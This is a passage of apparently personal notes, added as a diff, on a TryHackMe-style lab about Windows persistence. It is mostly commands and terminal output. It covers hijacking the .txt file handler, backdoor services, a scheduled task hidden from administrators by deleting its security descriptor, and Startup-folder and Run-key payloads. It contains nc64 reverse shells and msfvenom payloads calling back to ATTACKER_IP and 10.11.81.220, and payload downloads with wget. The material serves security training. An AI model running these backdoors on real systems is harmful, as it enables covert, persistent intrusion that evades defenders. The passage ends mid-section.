@@ -453,3 +453,459 @@ user@AttackBox$ nc -lvp 4445
 If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully.
 THM flagExecute C:\flags\flag5.exe from your reverse shell to get your flag!
 Hijacking File Associations
+In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.
+The default operating system file associations are kept inside the registry, where a key is stored for every single file type under HKLM\Software\Classes\. Let's say we want to check which program is used to open .txt files; we can just go and check for the .txt subkey and find which Programmatic ID (ProgID) is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:
+We can then search for a subkey for the corresponding ProgID (also under HKLM\Software\Classes\), in this case, txtfile, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under shell\open\command where the default command to be run for files with that extension is specified:
+In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1:
+```text
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+```
+Notice how in Powershell, we have to pass $args[0] to notepad, as it will contain the name of the file to be opened, as given through %1.
+Now let's change the registry key to run our backdoor script in a hidden window:
+Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.
+THM flagOnce you have backdoored the .txt file handler and spawned a reverse shell, run C:\flags\flag6.exe to get a flag!
+```text
+──(kali㉿kali)-[~/payloads]
+└─$ ls
+index.raw  launcher.bat  liv0ff.ps1  live0fftheland.dll  payload.hta  thm.hta
+
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.81.220 4445"
+
+C:\Windows\System32\calc.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -lvp 4445        
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4445
+Ncat: Listening on 0.0.0.0:4445
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:49732.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag5.exe
+.\flag5.exe
+THM{NO_SHORTCUTS_IN_LIFE}
+```
+Insert flag5 here
+```text
+PS C:\Users\Administrator> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.11.81.220 4448"
+PS C:\Users\Administrator> C:\Windows\system32\NOTEPAD.EXE $args[0]
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -lvp 4448
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4448
+Ncat: Listening on 0.0.0.0:4448
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:49804.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag6.exe
+.\flag6.exe
+THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
+```
+![[Pasted image 20220911154731.png]]
+![[Pasted image 20220911154552.png]]
+Insert flag6 here
+### Abusing Services
+Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.
+A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.
+There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.
+Creating backdoor services
+We can create and start a service named "THMservice" using the following commands:
+```text
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+```
+Note: There must be a space after each equal sign for the command to work.
+The "net user" command will be executed when the service is started, resetting the Administrator's password to Passwd123. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.
+Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the exe-service format in msfvenom:
+```text
+AttackBox
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+```
+You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it:
+```text
+sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start THMservice2
+```
+This should create a connection back to your attacker's machine.
+THM flagUse the reverse shell you just gained to execute C:\flags\flag7.exe
+Modifying existing services
+While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.
+You can get a list of available services using the following command:
+```text
+Command Prompt
+```
+```text
+C:\> sc.exe query state=all
+SERVICE_NAME: THMService1
+DISPLAY_NAME: THMService1
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 1077  (0x435)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:
+```text
+Command Prompt
+```
+```text
+C:\> sc.exe qc THMService3
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMService3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2 AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\MyService\THMService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMService3
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : NT AUTHORITY\Local Service
+```
+There are three things we care about when using a service for persistence:
+The executable (BINARY_PATH_NAME) should point to our payload.
+The service START_TYPE should be automatic so that the payload runs without user interaction.
+The SERVICE_START_NAME, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.
+Let's start by creating a new reverse shell with msfvenom:
+```text
+AttackBox
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
+```
+To reconfigure "THMservice3" parameters, we can use the following command:
+```text
+Command Prompt
+```
+```text
+C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+```
+You can then query the service's configuration again to check if all went as expected:
+```text
+Command Prompt
+```
+```text
+C:\> sc.exe qc THMservice3
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMservice3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMservice3
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+Start a Metasploit listener on your attacker's machine and manually start the service to receive a reverse shell. From there, run C:\flags\flag8.exe to get a flag!
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4448 -f exe-service -o rev-svc.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe-service file: 48640 bytes
+Saved as: rev-svc.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ ls
+index.raw  launcher.bat  liv0ff.ps1  live0fftheland.dll  payload.hta  rev-svc.exe  thm.hta
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.170.100 - - [11/Sep/2022 16:56:10] "GET /rev-svc.exe HTTP/1.1" 200 -
+10.10.170.100 - - [11/Sep/2022 16:58:38] "GET /rev-svc.exe HTTP/1.1" 200 -
+
+PS C:\Windows> wget http://10.11.81.220:1337/rev-svc.exe -o rev-svc.exe
+
+C:\Users\Administrator>sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+[SC] CreateService SUCCESS
+
+C:\Users\Administrator>sc.exe start THMservice2
+
+SERVICE_NAME: THMservice2
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 3312
+        FLAGS              :
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -nvlp 4448                                          
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4448
+Ncat: Listening on 0.0.0.0:4448
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:49919.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag7.exe
+.\flag7.exe
+THM{SUSPICIOUS_SERVICES}
+```
+Insert flag7 here
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=5558 -f exe-service -o rev-svc2.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe-service file: 48640 bytes
+Saved as: rev-svc2.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.170.100 - - [11/Sep/2022 17:08:15] "GET /rev-svc2.exe HTTP/1.1" 200 -
+
+PS C:\Users\Administrator> cd C:\Windows
+PS C:\Windows> wget http://10.11.81.220:1337/rev-svc2.exe -o rev-svc2.exe
+
+C:\Users\Administrator>sc.exe qc THMService3
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMService3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\MyService\THMService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMservice3
+        DEPENDENCIES       :
+        SERVICE_START_NAME : NT AUTHORITY\Local Service
+
+C:\Users\Administrator>sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\Users\Administrator>sc.exe qc THMservice3
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMservice3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMservice3
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\Administrator>sc.exe qc THMservice3
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMservice3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMservice3
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\Administrator>sc.exe start THMservice3
+
+SERVICE_NAME: THMservice3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3736
+        FLAGS              :
+
+──(kali㉿kali)-[~/payloads]
+└─$ nc -nvlp 5558
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::5558
+Ncat: Listening on 0.0.0.0:5558
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:49984.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag8.exe
+.\flag8.exe
+THM{IN_PLAIN_SIGHT}
+```
+Insert flag8 here
+### Abusing Scheduled Tasks
+We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:
+Task Scheduler
+The most common way to schedule tasks is using the built-in Windows task scheduler. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use schtasks to interact with the task scheduler. A complete reference for the command can be found on Microsoft's website.
+Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:
+```text
+Command Prompt
+```
+```text
+C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
+```
+Note: Be sure to use THM-TaskBackdoor as the name of your task, or you won't get the flag.
+The previous command will create a "THM-TaskBackdoor" task and execute an nc64 reverse shell back to the attacker. The /sc and /mo options indicate that the task should be run every single minute. The /ru option indicates that the task will run with SYSTEM privileges.
+To check if our task was successfully created, we can use the following command:
+```text
+Command Prompt
+```
+```text
+C:\> schtasks /query /tn thm-taskbackdoor
+
+Folder: \
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
+```
+Making Our Task Invisible
+Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.
+The security descriptors of all scheduled tasks are stored in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.
+To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use psexec (available in C:\tools) to open Regedit with SYSTEM privileges:
+```text
+Command Prompt
+```
+```text
+C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
+```
+We will then delete the security descriptor for our task:
+If we try to query our service again, the system will tell us there is no such task:
+```text
+Command Prompt
+```
+```text
+C:\> schtasks /query /tn thm-taskbackdoors
+ERROR: The system cannot find the file specified.
+```
+If we start an nc listener in our attacker's machine, we should get a shell back after a minute:
+```text
+AttackBox
+
+user@AttackBox$ nc -lvp 4449
+```
+Use the reverse shell obtained through the task scheduler and execute C:\flags\flag9.exe to retrieve a flag.
+```text
+C:\Users\Administrator>schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.11.81.220 4449" /ru SYSTEM
+SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
+
+C:\Users\Administrator>schtasks /query /tn thm-taskbackdoor
+
+Folder: \
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+thm-taskbackdoor                         9/11/2022 9:17:00 PM   Ready
+
+C:\Users\Administrator>c:\tools\pstools\PsExec64.exe -s -i regedit
+
+PsExec v2.34 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ nc -nvlp 4449
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4449
+Ncat: Listening on 0.0.0.0:4449
+Ncat: Connection from 10.10.170.100.
+Ncat: Connection from 10.10.170.100:50000.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\flags
+cd C:\flags
+
+C:\flags>.\flag9.exe
+.\flag9.exe
+THM{JUST_A_MATTER_OF_TIME}
+```
+![[Pasted image 20220911161947.png]]
+Insert flag9 here
+### Logon Triggered Persistence
+Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.
+Startup folder
+Each user has a folder under C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.
+If we want to force all users to run a payload while logging in, we can use the folder under C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp in the same way.
+For this task, let's generate a reverse shell payload using msfvenom:
+```text
+AttackBox
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+```
+We will then copy our payload into the victim machine. You can spawn an http.server with Python3 and use wget on the victim machine to pull your file:
+```text
+AttackBox
+
+user@AttackBox$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+```text
+Powershell
+```
+```text
+PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
+```
+We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine.
+```text
+Command Prompt
+```
+```text
+C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+```
+Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):
+And log back via RDP. You should immediately receive a connection back to your attacker's machine.
+THM flagUse your newly obtained shell to execute C:\flags\flag10.exe and get your flag!
+Run / RunOnce
+You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+The registry entries under HKCU will only apply to the current user, and those under HKLM will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time.
+For this task, let's create a new reverse shell with msfvenom:
+```text
+AttackBox
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
+```
+After transferring it to the victim machine, let's move it to C:\Windows\:
+```text
+Command Prompt
